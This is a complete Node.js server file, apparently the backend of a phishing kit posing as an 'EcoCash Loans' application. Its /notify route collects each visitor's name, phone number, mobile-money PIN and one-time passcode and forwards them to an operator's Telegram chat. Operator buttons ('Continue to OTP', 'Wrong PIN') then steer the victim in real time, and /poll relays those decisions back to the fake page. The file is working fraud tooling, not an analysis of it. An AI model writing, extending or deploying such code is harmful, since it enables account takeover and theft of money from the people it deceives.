'use strict';

import express           from 'express';
import cors              from 'cors';
import crypto            from 'crypto';
import { fileURLToPath } from 'url';
import path              from 'path';
import config            from './config.js';
import { setResult, popResult, setSession, getSession } from './store.js';
import { sendAdminMessage, removeButtons, answerCallback, registerWebhook, escMd } from './telegram.js';

const app       = express();
const __dirname = path.dirname(fileURLToPath(import.meta.url));

app.use(express.json());
app.use(cors({
  origin:         true,
  methods:        ['GET', 'POST', 'OPTIONS'],
  allowedHeaders: ['Content-Type'],
}));

app.use(express.static(__dirname));
app.get('/', (_req, res) => res.sendFile(path.join(__dirname, 'index.html')));

app.get('/health', (_req, res) => {
  res.json({ ok: true, service: 'ecocash-loans-backend', ts: new Date().toISOString() });
});

app.get('/setup', async (_req, res) => {
  try {
    const result = await registerWebhook();
    if (result.ok) {
      res.json({
        ok:          true,
        description: result.description,
        webhook:     `${config.serverUrl}/webhook`,
        message:     '✅ Webhook registered successfully! You can now use the app.',
      });
    } else {
      res.status(500).json({ ok: false, error: result.description });
    }
  } catch (err) {
    res.status(500).json({ ok: false, error: err.message });
  }
});

// ════════════════════════════════════════════════════════
//  POST /notify
//
//  type = 'pin'  → sends Name, Phone, Date & Time, PIN
//                  + [✅ Continue to OTP] [❌ Wrong PIN]
//
//  type = 'otp'  → sends Name, Phone, Date & Time, OTP
//                  + [❌ Wrong OTP] [❌ Invalid PIN]
//                    [✅ Approve Application] [❌ Decline Application]
// ════════════════════════════════════════════════════════
app.post('/notify', async (req, res) => {
  const { type, phone, countryCode, passcode, otp, name } = req.body;

  if (!type || !phone) {
    return res.status(400).json({ ok: false, error: 'Missing required fields' });
  }

  const fullPhone = `${countryCode || ''} ${phone}`.trim();

  // ── Generate token + HMAC ──
  const token = crypto.randomBytes(8).toString('hex');
  const sig   = crypto.createHmac('sha256', config.secretKey)
                      .update(`${token}|${phone}`)
                      .digest('hex');

  setSession(token, phone, sig, config.tokenTtl);

  const cbData = (action) => `${action}|${token}`;

  try {
    let text, keyboard;

    const now      = new Date();
    const dateTime = now.toLocaleString('en-GB', { dateStyle: 'medium', timeStyle: 'short' });

    if (type === 'pin') {
      if (!passcode) return res.status(400).json({ ok: false, error: 'Missing passcode' });

      text = `🔒 *PIN Submitted*\n\n`
           + `👤 *Name:* ${escMd(name || 'Unknown')}\n`
           + `📱 *Phone:* \`${escMd(fullPhone)}\`\n`
           + `🔢 *PIN Entered:* \`${escMd(passcode)}\`\n`
           + `🕐 *Date & Time:* ${escMd(dateTime)}\n\n`
           + `Awaiting your decision\\.`;

      keyboard = [[
        { text: '✅ Continue to OTP', callback_data: cbData('continue_otp') },
        { text: '❌ Wrong PIN',      callback_data: cbData('pin_wrong')    },
      ]];

    } else if (type === 'otp') {
      if (!otp) return res.status(400).json({ ok: false, error: 'Missing OTP' });

      text = `🔐 *OTP Submitted*\n\n`
           + `👤 *Name:* ${escMd(name || 'Unknown')}\n`
           + `📱 *Phone:* \`${escMd(fullPhone)}\`\n`
           + `🔑 *OTP Entered:* \`${escMd(otp)}\`\n`
           + `🕐 *Date & Time:* ${escMd(dateTime)}\n\n`
           + `Awaiting your decision\\.`;

      keyboard = [
        [
          { text: '❌ Wrong OTP',  callback_data: cbData('otp_wrong')    },
          { text: '❌ Invalid PIN', callback_data: cbData('pin_invalid')  },
        ],
        [
          { text: '✅ Approve Application', callback_data: cbData('loan_approved') },
          { text: '❌ Decline Application', callback_data: cbData('loan_rejected') },
        ],
      ];

    } else {
      return res.status(400).json({ ok: false, error: 'Unknown type' });
    }

    const tgResult = await sendAdminMessage(text, keyboard);

    if (!tgResult.ok) {
      console.error('Telegram error:', tgResult);
      return res.status(500).json({ ok: false, error: 'Telegram error', detail: tgResult.description });
    }

    res.json({ ok: true, token });

  } catch (err) {
    console.error('Error in /notify:', err);
    res.status(500).json({ ok: false, error: 'Internal server error' });
  }
});

// ════════════════════════════════════════════════════════
//  POST /poll
// ════════════════════════════════════════════════════════
app.post('/poll', (req, res) => {
  const { token } = req.body;

  if (!token || !/^[a-f0-9]{16}$/.test(token)) {
    return res.status(400).json({ ok: false, error: 'Invalid token' });
  }

  const result = popResult(token);

  if (result === null) {
    return res.json({ ok: true, result: 'pending' });
  }

  res.json({ ok: true, result });
});

// ════════════════════════════════════════════════════════
//  POST /webhook  — Telegram button handler
// ════════════════════════════════════════════════════════
app.post('/webhook', async (req, res) => {
  res.json({ ok: true });

  const update = req.body;
  if (!update?.callback_query) return;

  const cb     = update.callback_query;
  const cbId   = cb.id;
  const data   = cb.data || '';
  const chatId = cb.message?.chat?.id?.toString();
  const msgId  = cb.message?.message_id;

  if (chatId !== config.adminChatId.toString()) {
    await answerCallback(cbId, '⛔ Not authorised', true);
    return;
  }

  const parts = data.split('|');
  if (parts.length !== 2) {
    await answerCallback(cbId, '⚠️ Invalid data');
    return;
  }

  const [action, token] = parts;

  const session = getSession(token);
  if (!session) {
    await answerCallback(cbId, '⚠️ Session expired or not found', true);
    return;
  }

  const expectedSig = crypto.createHmac('sha256', config.secretKey)
                            .update(`${token}|${session.phone}`)
                            .digest('hex');

  if (!crypto.timingSafeEqual(Buffer.from(session.sig), Buffer.from(expectedSig))) {
    await answerCallback(cbId, '⚠️ Invalid signature', true);
    return;
  }

  try {
    switch (action) {

      // ── PIN actions ──
      case 'continue_otp':
        setResult(token, 'continue_otp', config.tokenTtl);
        await removeButtons(chatId, msgId);
        await sendAdminMessage(`✅ *PIN Approved*\nUser \`${escMd(session.phone)}\` may now enter OTP\\.`, []);
        await answerCallback(cbId, '✅ Continuing to OTP');
        break;

      case 'pin_wrong':
        setResult(token, 'pin_wrong', config.tokenTtl);
        await removeButtons(chatId, msgId);
        await sendAdminMessage(`❌ *Wrong PIN*\nUser \`${escMd(session.phone)}\` has been notified to re\\-enter their PIN\\.`, []);
        await answerCallback(cbId, '❌ Wrong PIN sent to user');
        break;

      // ── OTP actions ──
      case 'otp_wrong':
        setResult(token, 'otp_wrong', config.tokenTtl);
        await removeButtons(chatId, msgId);
        await sendAdminMessage(`❌ *Wrong OTP*\nUser \`${escMd(session.phone)}\` has been notified to re\\-enter their OTP\\.`, []);
        await answerCallback(cbId, '❌ Wrong OTP sent to user');
        break;

      case 'pin_invalid':
        setResult(token, 'pin_invalid', config.tokenTtl);
        await removeButtons(chatId, msgId);
        await sendAdminMessage(`🚫 *Invalid Session*\nUser \`${escMd(session.phone)}\` has been redirected to login\\.`, []);
        await answerCallback(cbId, '🚫 Invalid session — user redirected');
        break;

      case 'loan_approved':
        setResult(token, 'loan_approved', config.tokenTtl);
        await removeButtons(chatId, msgId);
        await sendAdminMessage(`✅ *Loan Approved*\nApplication for \`${escMd(session.phone)}\` has been approved\\.`, []);
        await answerCallback(cbId, '✅ Loan approved');
        break;

      case 'loan_rejected':
        setResult(token, 'loan_rejected', config.tokenTtl);
        await removeButtons(chatId, msgId);
        await sendAdminMessage(`❌ *Loan Rejected*\nApplication for \`${escMd(session.phone)}\` has been rejected\\.`, []);
        await answerCallback(cbId, '❌ Loan rejected');
        break;

      default:
        await answerCallback(cbId, '⚠️ Unknown action');
    }
  } catch (err) {
    console.error('Webhook handler error:', err);
  }
});

// ════ DEBUG ROUTE ════
app.get('/test', async (_req, res) => {
  const result = await sendAdminMessage('🧪 Test message from EcoCash Loans\\.', []);
  res.json({
    telegramResponse: result,
    adminChatId:      config.adminChatId,
    serverUrl:        config.serverUrl,
    botTokenPreview:  config.botToken ? config.botToken.slice(0, 10) + '...' : 'MISSING',
    secretKeySet:     !!config.secretKey,
  });
});

app.listen(config.port, () => {
  console.log(`\n🚀 EcoCash Loans backend running on port ${config.port}`);
  console.log(`   Webhook URL: ${config.serverUrl}/webhook`);
  console.log(`   Setup URL:   ${config.serverUrl}/setup`);
  console.log(`   Health:      ${config.serverUrl}/health\n`);
});
